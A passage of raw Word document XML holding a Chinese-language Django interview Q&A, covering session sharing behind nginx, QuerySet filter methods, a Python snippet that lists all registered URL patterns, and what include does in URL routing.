          <w:sz w:val="32"/>
          <w:szCs w:val="32"/>
        </w:rPr>
        <w:t>025</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Verdana" w:hAnsi="Verdana" w:hint="eastAsia"/>
          <w:color w:val="FFFFFF"/>
          <w:sz w:val="32"/>
          <w:szCs w:val="32"/>
        </w:rPr>
        <w:t>、</w:t>
      </w:r>
      <w:r w:rsidR="00717181" w:rsidRPr="00A1017F">
        <w:rPr>
          <w:rFonts w:ascii="Verdana" w:hAnsi="Verdana"/>
          <w:color w:val="FFFFFF"/>
          <w:sz w:val="32"/>
          <w:szCs w:val="32"/>
        </w:rPr>
        <w:t>Django</w:t>
      </w:r>
      <w:r w:rsidR="00717181" w:rsidRPr="00325D76">
        <w:rPr>
          <w:rFonts w:ascii="Verdana" w:hAnsi="Verdana"/>
          <w:color w:val="FFFFFF"/>
          <w:sz w:val="32"/>
          <w:szCs w:val="32"/>
        </w:rPr>
        <w:t>中当用户登录到</w:t>
      </w:r>
      <w:r w:rsidR="00717181" w:rsidRPr="00325D76">
        <w:rPr>
          <w:rFonts w:ascii="Verdana" w:hAnsi="Verdana"/>
          <w:color w:val="FFFFFF"/>
          <w:sz w:val="32"/>
          <w:szCs w:val="32"/>
        </w:rPr>
        <w:t>A</w:t>
      </w:r>
      <w:r w:rsidR="00717181" w:rsidRPr="00325D76">
        <w:rPr>
          <w:rFonts w:ascii="Verdana" w:hAnsi="Verdana"/>
          <w:color w:val="FFFFFF"/>
          <w:sz w:val="32"/>
          <w:szCs w:val="32"/>
        </w:rPr>
        <w:t>服务器进入登陆状态，下次被</w:t>
      </w:r>
      <w:r w:rsidR="00717181" w:rsidRPr="00325D76">
        <w:rPr>
          <w:rFonts w:ascii="Verdana" w:hAnsi="Verdana"/>
          <w:color w:val="FFFFFF"/>
          <w:sz w:val="32"/>
          <w:szCs w:val="32"/>
        </w:rPr>
        <w:t>nginx</w:t>
      </w:r>
      <w:r w:rsidR="00717181" w:rsidRPr="00325D76">
        <w:rPr>
          <w:rFonts w:ascii="Verdana" w:hAnsi="Verdana"/>
          <w:color w:val="FFFFFF"/>
          <w:sz w:val="32"/>
          <w:szCs w:val="32"/>
        </w:rPr>
        <w:t>代理到</w:t>
      </w:r>
      <w:r w:rsidR="00717181" w:rsidRPr="00325D76">
        <w:rPr>
          <w:rFonts w:ascii="Verdana" w:hAnsi="Verdana"/>
          <w:color w:val="FFFFFF"/>
          <w:sz w:val="32"/>
          <w:szCs w:val="32"/>
        </w:rPr>
        <w:t>B</w:t>
      </w:r>
      <w:r w:rsidR="00717181" w:rsidRPr="00325D76">
        <w:rPr>
          <w:rFonts w:ascii="Verdana" w:hAnsi="Verdana"/>
          <w:color w:val="FFFFFF"/>
          <w:sz w:val="32"/>
          <w:szCs w:val="32"/>
        </w:rPr>
        <w:t>服务器会出现什么影响</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="0B051CA6" w14:textId="77777777" w:rsidR="00A1017F" w:rsidRPr="00325D76" w:rsidRDefault="00A1017F" w:rsidP="00325D76">
      <w:pPr>
        <w:pStyle w:val="2"/>
        <w:shd w:val="clear" w:color="auto" w:fill="98D5E5"/>
        <w:spacing w:before="0" w:beforeAutospacing="0" w:after="0" w:afterAutospacing="0" w:line="440" w:lineRule="exact"/>
        <w:contextualSpacing/>
        <w:rPr>
          <w:ins w:id="189" w:author="ABM ABM" w:date="2020-08-16T13:42:00Z"/>
          <w:rFonts w:ascii="Verdana" w:hAnsi="Verdana"/>
          <w:color w:val="FFFFFF"/>
          <w:sz w:val="32"/>
          <w:szCs w:val="32"/>
          <w:rPrChange w:id="190" w:author="ABM ABM" w:date="2020-08-16T13:44:00Z">
            <w:rPr>
              <w:ins w:id="191" w:author="ABM ABM" w:date="2020-08-16T13:42:00Z"/>
            </w:rPr>
          </w:rPrChange>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="40731EA2" w14:textId="5E28C510" w:rsidR="00717181" w:rsidRPr="00D2274A" w:rsidDel="00A1017F" w:rsidRDefault="00717181" w:rsidP="00D2274A">
      <w:pPr>
        <w:pStyle w:val="HTML"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F5F5F5"/>
        <w:rPr>
          <w:del w:id="192" w:author="ABM ABM" w:date="2020-08-16T13:42:00Z"/>
          <w:color w:val="008000"/>
        </w:rPr>
      </w:pPr>
      <w:del w:id="193" w:author="ABM ABM" w:date="2020-08-16T13:42:00Z">
        <w:r w:rsidRPr="00D2274A" w:rsidDel="00A1017F">
          <w:rPr>
            <w:color w:val="008000"/>
          </w:rPr>
          <w:br/>
        </w:r>
      </w:del>
      <w:r w:rsidRPr="00D2274A">
        <w:rPr>
          <w:color w:val="008000"/>
        </w:rPr>
        <w:t>如果用户在A应用服务器登陆的session数据没有共享到B应用服务器，那么之前的登录状态就没有了。</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="75AFD1AA" w14:textId="2EED0DE2" w:rsidR="00717181" w:rsidRDefault="00717181" w:rsidP="00717181">
      <w:pPr>
        <w:shd w:val="clear" w:color="auto" w:fill="FFFFFF"/>
        <w:rPr>
          <w:rFonts w:ascii="Verdana" w:hAnsi="Verdana"/>
          <w:color w:val="333333"/>
          <w:szCs w:val="21"/>
        </w:rPr>
      </w:pPr>
      <w:del w:id="194" w:author="ABM ABM" w:date="2020-08-16T13:42:00Z">
        <w:r w:rsidDel="00A1017F">
          <w:rPr>
            <w:rFonts w:ascii="Verdana" w:hAnsi="Verdana"/>
            <w:color w:val="333333"/>
            <w:szCs w:val="21"/>
          </w:rPr>
          <w:delText> </w:delText>
        </w:r>
      </w:del>
    </w:p>
    <w:p w14:paraId="05566ECD" w14:textId="4842F73D" w:rsidR="00717181" w:rsidRDefault="00D2274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028</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Verdana" w:hAnsi="Verdana" w:hint="eastAsia"/>
          <w:color w:val="FFFFFF"/>
          <w:sz w:val="32"/>
          <w:szCs w:val="32"/>
        </w:rPr>
        <w:t>、</w:t>
      </w:r>
      <w:r w:rsidR="00717181">
        <w:rPr>
          <w:rFonts w:ascii="Verdana" w:hAnsi="Verdana"/>
          <w:color w:val="FFFFFF"/>
          <w:sz w:val="32"/>
          <w:szCs w:val="32"/>
        </w:rPr>
        <w:t>查询集返回的列表过滤器有哪些</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="5FE55330" w14:textId="77777777" w:rsidR="00717181" w:rsidRPr="00D2274A" w:rsidRDefault="00717181" w:rsidP="00D2274A">
      <w:pPr>
        <w:pStyle w:val="HTML"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F5F5F5"/>
        <w:rPr>
          <w:color w:val="008000"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00D2274A">
        <w:rPr>
          <w:color w:val="008000"/>
        </w:rPr>
        <w:t>all()：返回所有数据</w:t>
      </w:r>
      <w:r w:rsidRPr="00D2274A">
        <w:rPr>
          <w:color w:val="008000"/>
        </w:rPr>
        <w:t> </w:t>
      </w:r>
      <w:r w:rsidRPr="00D2274A">
        <w:rPr>
          <w:color w:val="008000"/>
        </w:rPr>
        <w:t> </w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="7BB5496B" w14:textId="77777777" w:rsidR="00717181" w:rsidRPr="00D2274A" w:rsidRDefault="00717181" w:rsidP="00D2274A">
      <w:pPr>
        <w:pStyle w:val="HTML"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F5F5F5"/>
        <w:rPr>
          <w:color w:val="008000"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00D2274A">
        <w:rPr>
          <w:color w:val="008000"/>
        </w:rPr>
        <w:t>filter()：返回满足条件的数据</w:t>
      </w:r>
      <w:r w:rsidRPr="00D2274A">
        <w:rPr>
          <w:color w:val="008000"/>
        </w:rPr>
        <w:t> </w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="74CE7B7D" w14:textId="77777777" w:rsidR="00717181" w:rsidRPr="00D2274A" w:rsidRDefault="00717181" w:rsidP="00D2274A">
      <w:pPr>
        <w:pStyle w:val="HTML"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F5F5F5"/>
        <w:rPr>
          <w:color w:val="008000"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00D2274A">
        <w:rPr>
          <w:color w:val="008000"/>
        </w:rPr>
        <w:t>exclude()：返回满足条件之外的数据，相当于sql语句中where部分的not关键字</w:t>
      </w:r>
      <w:r w:rsidRPr="00D2274A">
        <w:rPr>
          <w:color w:val="008000"/>
        </w:rPr>
        <w:t> </w:t>
      </w:r>
      <w:r w:rsidRPr="00D2274A">
        <w:rPr>
          <w:color w:val="008000"/>
        </w:rPr>
        <w:t> </w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="6E3A4C12" w14:textId="139DDB89" w:rsidR="00717181" w:rsidRPr="00D2274A" w:rsidRDefault="00717181" w:rsidP="00D2274A">
      <w:pPr>
        <w:pStyle w:val="HTML"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F5F5F5"/>
        <w:rPr>
          <w:color w:val="008000"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00D2274A">
        <w:rPr>
          <w:color w:val="008000"/>
        </w:rPr>
        <w:t>order_by()：排序</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="542DC288" w14:textId="0DD00024" w:rsidR="00717181" w:rsidRPr="00557AFE" w:rsidRDefault="00A52FA8" w:rsidP="00557AFE">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029</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Verdana" w:hAnsi="Verdana" w:hint="eastAsia"/>
          <w:color w:val="FFFFFF"/>
          <w:sz w:val="32"/>
          <w:szCs w:val="32"/>
        </w:rPr>
        <w:t>、</w:t>
      </w:r>
      <w:r w:rsidR="00717181">
        <w:rPr>
          <w:rFonts w:ascii="Verdana" w:hAnsi="Verdana"/>
          <w:color w:val="FFFFFF"/>
          <w:sz w:val="32"/>
          <w:szCs w:val="32"/>
        </w:rPr>
        <w:t>如何获取</w:t>
      </w:r>
      <w:r w:rsidR="00717181">
        <w:rPr>
          <w:rFonts w:ascii="Verdana" w:hAnsi="Verdana"/>
          <w:color w:val="FFFFFF"/>
          <w:sz w:val="32"/>
          <w:szCs w:val="32"/>
        </w:rPr>
        <w:t>django urlpatterns</w:t>
      </w:r>
      <w:r w:rsidR="00717181">
        <w:rPr>
          <w:rFonts w:ascii="Verdana" w:hAnsi="Verdana"/>
          <w:color w:val="FFFFFF"/>
          <w:sz w:val="32"/>
          <w:szCs w:val="32"/>
        </w:rPr>
        <w:t>里面注册的所有</w:t>
      </w:r>
      <w:r w:rsidR="00717181">
        <w:rPr>
          <w:rFonts w:ascii="Verdana" w:hAnsi="Verdana"/>
          <w:color w:val="FFFFFF"/>
          <w:sz w:val="32"/>
          <w:szCs w:val="32"/>
        </w:rPr>
        <w:t>url?</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="7A8CCC78" w14:textId="77777777" w:rsidR="00717181" w:rsidRPr="00D2274A" w:rsidRDefault="00717181" w:rsidP="00D2274A">
      <w:pPr>
        <w:pStyle w:val="HTML"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F5F5F5"/>
        <w:rPr>
          <w:color w:val="008000"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00D2274A">
        <w:rPr>
          <w:color w:val="008000"/>
        </w:rPr>
        <w:t>from django.conf.urls import url,include</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="068D1B79" w14:textId="77777777" w:rsidR="00717181" w:rsidRPr="00D2274A" w:rsidRDefault="00717181" w:rsidP="00D2274A">
      <w:pPr>
        <w:pStyle w:val="HTML"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F5F5F5"/>
        <w:rPr>
          <w:color w:val="008000"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00D2274A">
        <w:rPr>
          <w:color w:val="008000"/>
        </w:rPr>
        <w:t>from arya.service.sites import site</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="6E639871" w14:textId="77777777" w:rsidR="00717181" w:rsidRPr="00D2274A" w:rsidRDefault="00717181" w:rsidP="00D2274A">
      <w:pPr>
        <w:pStyle w:val="HTML"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F5F5F5"/>
        <w:rPr>
          <w:color w:val="008000"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00D2274A">
        <w:rPr>
          <w:color w:val="008000"/>
        </w:rPr>
        <w:t>from django.urls.resolvers import RegexURLPattern</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="7DDC1CAF" w14:textId="77777777" w:rsidR="00717181" w:rsidRPr="00D2274A" w:rsidRDefault="00717181" w:rsidP="00D2274A">
      <w:pPr>
        <w:pStyle w:val="HTML"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F5F5F5"/>
        <w:rPr>
          <w:color w:val="008000"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00D2274A">
        <w:rPr>
          <w:color w:val="008000"/>
        </w:rPr>
        <w:t>from django.urls.resolvers import RegexURLResolver</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="00456CAD" w14:textId="77777777" w:rsidR="00717181" w:rsidRPr="00D2274A" w:rsidRDefault="00717181" w:rsidP="00D2274A">
      <w:pPr>
        <w:pStyle w:val="HTML"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F5F5F5"/>
        <w:rPr>
          <w:color w:val="008000"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00D2274A">
        <w:rPr>
          <w:color w:val="008000"/>
        </w:rPr>
        <w:t>from django.shortcuts import HttpResponse</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="0266C925" w14:textId="77777777" w:rsidR="00717181" w:rsidRPr="00D2274A" w:rsidRDefault="00717181" w:rsidP="00D2274A">
      <w:pPr>
        <w:pStyle w:val="HTML"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F5F5F5"/>
        <w:rPr>
          <w:color w:val="008000"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00D2274A">
        <w:rPr>
          <w:color w:val="008000"/>
        </w:rPr>
        <w:t> </w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="3C3F4EEF" w14:textId="77777777" w:rsidR="00717181" w:rsidRPr="00D2274A" w:rsidRDefault="00717181" w:rsidP="00D2274A">
      <w:pPr>
        <w:pStyle w:val="HTML"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F5F5F5"/>
        <w:rPr>
          <w:color w:val="008000"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00D2274A">
        <w:rPr>
          <w:color w:val="008000"/>
        </w:rPr>
        <w:t>def index(request):</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="63C3FB68" w14:textId="77777777" w:rsidR="00717181" w:rsidRPr="00D2274A" w:rsidRDefault="00717181" w:rsidP="00D2274A">
      <w:pPr>
        <w:pStyle w:val="HTML"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F5F5F5"/>
        <w:rPr>
          <w:color w:val="008000"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00D2274A">
        <w:rPr>
          <w:color w:val="008000"/>
        </w:rPr>
        <w:t>  print(get_all_url(urlpatterns,prev='/'))</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="7090A177" w14:textId="77777777" w:rsidR="00717181" w:rsidRPr="00D2274A" w:rsidRDefault="00717181" w:rsidP="00D2274A">
      <w:pPr>
        <w:pStyle w:val="HTML"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F5F5F5"/>
        <w:rPr>
          <w:color w:val="008000"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00D2274A">
        <w:rPr>
          <w:color w:val="008000"/>
        </w:rPr>
        <w:t>  return HttpResponse('...')</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="778F4684" w14:textId="77777777" w:rsidR="00717181" w:rsidRPr="00D2274A" w:rsidRDefault="00717181" w:rsidP="00D2274A">
      <w:pPr>
        <w:pStyle w:val="HTML"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F5F5F5"/>
        <w:rPr>
          <w:color w:val="008000"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00D2274A">
        <w:rPr>
          <w:color w:val="008000"/>
        </w:rPr>
        <w:t> </w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="4E91328F" w14:textId="77777777" w:rsidR="00717181" w:rsidRPr="00D2274A" w:rsidRDefault="00717181" w:rsidP="00D2274A">
      <w:pPr>
        <w:pStyle w:val="HTML"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F5F5F5"/>
        <w:rPr>
          <w:color w:val="008000"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00D2274A">
        <w:rPr>
          <w:color w:val="008000"/>
        </w:rPr>
        <w:t>def get_all_url(urlparrentens,prev,is_first=False,result=[]):</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="334D747D" w14:textId="77777777" w:rsidR="00717181" w:rsidRPr="00D2274A" w:rsidRDefault="00717181" w:rsidP="00D2274A">
      <w:pPr>
        <w:pStyle w:val="HTML"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F5F5F5"/>
        <w:rPr>
          <w:color w:val="008000"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00D2274A">
        <w:rPr>
          <w:color w:val="008000"/>
        </w:rPr>
        <w:t>  if is_first:</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="3D7A9F66" w14:textId="77777777" w:rsidR="00717181" w:rsidRPr="00D2274A" w:rsidRDefault="00717181" w:rsidP="00D2274A">
      <w:pPr>
        <w:pStyle w:val="HTML"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F5F5F5"/>
        <w:rPr>
          <w:color w:val="008000"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00D2274A">
        <w:rPr>
          <w:color w:val="008000"/>
        </w:rPr>
        <w:lastRenderedPageBreak/>
        <w:t>    result.clear()</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="2441EA8B" w14:textId="77777777" w:rsidR="00717181" w:rsidRPr="00D2274A" w:rsidRDefault="00717181" w:rsidP="00D2274A">
      <w:pPr>
        <w:pStyle w:val="HTML"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F5F5F5"/>
        <w:rPr>
          <w:color w:val="008000"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00D2274A">
        <w:rPr>
          <w:color w:val="008000"/>
        </w:rPr>
        <w:t>  for item in urlparrentens:</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="0FCF8BD9" w14:textId="77777777" w:rsidR="00717181" w:rsidRPr="00D2274A" w:rsidRDefault="00717181" w:rsidP="00D2274A">
      <w:pPr>
        <w:pStyle w:val="HTML"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F5F5F5"/>
        <w:rPr>
          <w:color w:val="008000"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00D2274A">
        <w:rPr>
          <w:color w:val="008000"/>
        </w:rPr>
        <w:t>    v = item._regex.strip('^')    #去掉url中的^和')    #去掉url中的^和</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="2834C3E6" w14:textId="77777777" w:rsidR="00717181" w:rsidRPr="00D2274A" w:rsidRDefault="00717181" w:rsidP="00D2274A">
      <w:pPr>
        <w:pStyle w:val="HTML"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F5F5F5"/>
        <w:rPr>
          <w:color w:val="008000"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00D2274A">
        <w:rPr>
          <w:color w:val="008000"/>
        </w:rPr>
        <w:t>    if isinstance(item,RegexURLPattern):</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="0B4C0DA6" w14:textId="77777777" w:rsidR="00717181" w:rsidRPr="00D2274A" w:rsidRDefault="00717181" w:rsidP="00D2274A">
      <w:pPr>
        <w:pStyle w:val="HTML"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F5F5F5"/>
        <w:rPr>
          <w:color w:val="008000"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00D2274A">
        <w:rPr>
          <w:color w:val="008000"/>
        </w:rPr>
        <w:t>      result.append(prev + v)</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="7FB44A87" w14:textId="77777777" w:rsidR="00717181" w:rsidRPr="00D2274A" w:rsidRDefault="00717181" w:rsidP="00D2274A">
      <w:pPr>
        <w:pStyle w:val="HTML"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F5F5F5"/>
        <w:rPr>
          <w:color w:val="008000"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00D2274A">
        <w:rPr>
          <w:color w:val="008000"/>
        </w:rPr>
        <w:t>    else:</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="429C2A35" w14:textId="77777777" w:rsidR="00717181" w:rsidRPr="00D2274A" w:rsidRDefault="00717181" w:rsidP="00D2274A">
      <w:pPr>
        <w:pStyle w:val="HTML"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F5F5F5"/>
        <w:rPr>
          <w:color w:val="008000"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00D2274A">
        <w:rPr>
          <w:color w:val="008000"/>
        </w:rPr>
        <w:t>      get_all_url(item.urlconf_name,prev + v)</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="7C0C152F" w14:textId="77777777" w:rsidR="00717181" w:rsidRPr="00D2274A" w:rsidRDefault="00717181" w:rsidP="00D2274A">
      <w:pPr>
        <w:pStyle w:val="HTML"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F5F5F5"/>
        <w:rPr>
          <w:color w:val="008000"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00D2274A">
        <w:rPr>
          <w:color w:val="008000"/>
        </w:rPr>
        <w:t>  return result</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="7695956C" w14:textId="77777777" w:rsidR="00717181" w:rsidRPr="00D2274A" w:rsidRDefault="00717181" w:rsidP="00D2274A">
      <w:pPr>
        <w:pStyle w:val="HTML"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F5F5F5"/>
        <w:rPr>
          <w:color w:val="008000"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00D2274A">
        <w:rPr>
          <w:color w:val="008000"/>
        </w:rPr>
        <w:t> </w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="6392390F" w14:textId="77777777" w:rsidR="00717181" w:rsidRPr="00D2274A" w:rsidRDefault="00717181" w:rsidP="00D2274A">
      <w:pPr>
        <w:pStyle w:val="HTML"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F5F5F5"/>
        <w:rPr>
          <w:color w:val="008000"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00D2274A">
        <w:rPr>
          <w:color w:val="008000"/>
        </w:rPr>
        <w:t>urlpatterns = [</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="7BA3D2C8" w14:textId="77777777" w:rsidR="00717181" w:rsidRPr="00D2274A" w:rsidRDefault="00717181" w:rsidP="00D2274A">
      <w:pPr>
        <w:pStyle w:val="HTML"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F5F5F5"/>
        <w:rPr>
          <w:color w:val="008000"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00D2274A">
        <w:rPr>
          <w:color w:val="008000"/>
        </w:rPr>
        <w:t>  url(r'^arya/', site.urls),</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="56DA36CB" w14:textId="77777777" w:rsidR="00717181" w:rsidRPr="00D2274A" w:rsidRDefault="00717181" w:rsidP="00D2274A">
      <w:pPr>
        <w:pStyle w:val="HTML"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F5F5F5"/>
        <w:rPr>
          <w:color w:val="008000"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00D2274A">
        <w:rPr>
          <w:color w:val="008000"/>
        </w:rPr>
        <w:t>  url(r'^index/', index),</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="7E709EF3" w14:textId="271FE1CA" w:rsidR="00717181" w:rsidRPr="00D2274A" w:rsidRDefault="00717181" w:rsidP="00D2274A">
      <w:pPr>
        <w:pStyle w:val="HTML"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F5F5F5"/>
        <w:rPr>
          <w:color w:val="008000"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00D2274A">
        <w:rPr>
          <w:color w:val="008000"/>
        </w:rPr>
        <w:t>]</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="6101E559" w14:textId="352FDB6A" w:rsidR="00717181" w:rsidRPr="00325D76" w:rsidRDefault="00A52FA8"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030</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Verdana" w:hAnsi="Verdana" w:hint="eastAsia"/>
          <w:color w:val="FFFFFF"/>
          <w:sz w:val="32"/>
          <w:szCs w:val="32"/>
        </w:rPr>
        <w:t>、</w:t>
      </w:r>
      <w:r w:rsidR="00717181">
        <w:rPr>
          <w:rFonts w:ascii="Verdana" w:hAnsi="Verdana"/>
          <w:color w:val="FFFFFF"/>
          <w:sz w:val="32"/>
          <w:szCs w:val="32"/>
        </w:rPr>
        <w:t>django</w:t>
      </w:r>
      <w:r w:rsidR="00717181">
        <w:rPr>
          <w:rFonts w:ascii="Verdana" w:hAnsi="Verdana"/>
          <w:color w:val="FFFFFF"/>
          <w:sz w:val="32"/>
          <w:szCs w:val="32"/>
        </w:rPr>
        <w:t>路由系统中</w:t>
      </w:r>
      <w:r w:rsidR="00717181">
        <w:rPr>
          <w:rFonts w:ascii="Verdana" w:hAnsi="Verdana"/>
          <w:color w:val="FFFFFF"/>
          <w:sz w:val="32"/>
          <w:szCs w:val="32"/>
        </w:rPr>
        <w:t>include</w:t>
      </w:r>
      <w:r w:rsidR="00717181">
        <w:rPr>
          <w:rFonts w:ascii="Verdana" w:hAnsi="Verdana"/>
          <w:color w:val="FFFFFF"/>
          <w:sz w:val="32"/>
          <w:szCs w:val="32"/>
        </w:rPr>
        <w:t>是干嘛用的？</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="20C86691" w14:textId="77777777" w:rsidR="00717181" w:rsidRPr="00A52FA8" w:rsidRDefault="00717181" w:rsidP="00A52FA8">
      <w:pPr>
        <w:pStyle w:val="HTML"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F5F5F5"/>
        <w:rPr>
          <w:color w:val="008000"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00A52FA8">
        <w:rPr>
          <w:color w:val="008000"/>
        </w:rPr>
        <w:t>include路由转发</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="72E50C00" w14:textId="2B183F76" w:rsidR="00717181" w:rsidRPr="00A52FA8" w:rsidRDefault="00717181" w:rsidP="00A52FA8">
      <w:pPr>
        <w:pStyle w:val="HTML"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F5F5F5"/>
        <w:rPr>
          <w:color w:val="008000"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00A52FA8">
        <w:rPr>
          <w:color w:val="008000"/>
        </w:rPr>
        <w:t>通常，我们会在每个app里，各自创建一个urls.py路由模块，然后从根路由出发，将app所属的url请求，全部转发到相应的urls.py模块中。</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="1EC55C8E" w14:textId="13B59167" w:rsidR="00717181" w:rsidRDefault="00A52FA8"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031</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Verdana" w:hAnsi="Verdana" w:hint="eastAsia"/>
          <w:color w:val="FFFFFF"/>
          <w:sz w:val="32"/>
          <w:szCs w:val="32"/>
        </w:rPr>
        <w:t>、</w:t>
      </w:r>
      <w:r w:rsidR="00717181">
        <w:rPr>
          <w:rFonts w:ascii="Verdana" w:hAnsi="Verdana"/>
          <w:color w:val="FFFFFF"/>
          <w:sz w:val="32"/>
          <w:szCs w:val="32"/>
        </w:rPr>
        <w:t>django2.0</w:t>
      </w:r>
      <w:r w:rsidR="00717181">
        <w:rPr>
          <w:rFonts w:ascii="Verdana" w:hAnsi="Verdana"/>
          <w:color w:val="FFFFFF"/>
          <w:sz w:val="32"/>
          <w:szCs w:val="32"/>
        </w:rPr>
        <w:t>中的</w:t>
      </w:r>
      <w:r w:rsidR="00717181">
        <w:rPr>
          <w:rFonts w:ascii="Verdana" w:hAnsi="Verdana"/>
          <w:color w:val="FFFFFF"/>
          <w:sz w:val="32"/>
          <w:szCs w:val="32"/>
        </w:rPr>
        <w:t>path</w:t>
      </w:r>
      <w:r w:rsidR="00717181">
        <w:rPr>
          <w:rFonts w:ascii="Verdana" w:hAnsi="Verdana"/>
          <w:color w:val="FFFFFF"/>
          <w:sz w:val="32"/>
          <w:szCs w:val="32"/>
        </w:rPr>
        <w:t>与</w:t>
      </w:r>
      <w:r w:rsidR="00717181">
        <w:rPr>
          <w:rFonts w:ascii="Verdana" w:hAnsi="Verdana"/>
          <w:color w:val="FFFFFF"/>
          <w:sz w:val="32"/>
          <w:szCs w:val="32"/>
        </w:rPr>
        <w:t>django1.xx</w:t>
      </w:r>
      <w:r w:rsidR="00717181">
        <w:rPr>
          <w:rFonts w:ascii="Verdana" w:hAnsi="Verdana"/>
          <w:color w:val="FFFFFF"/>
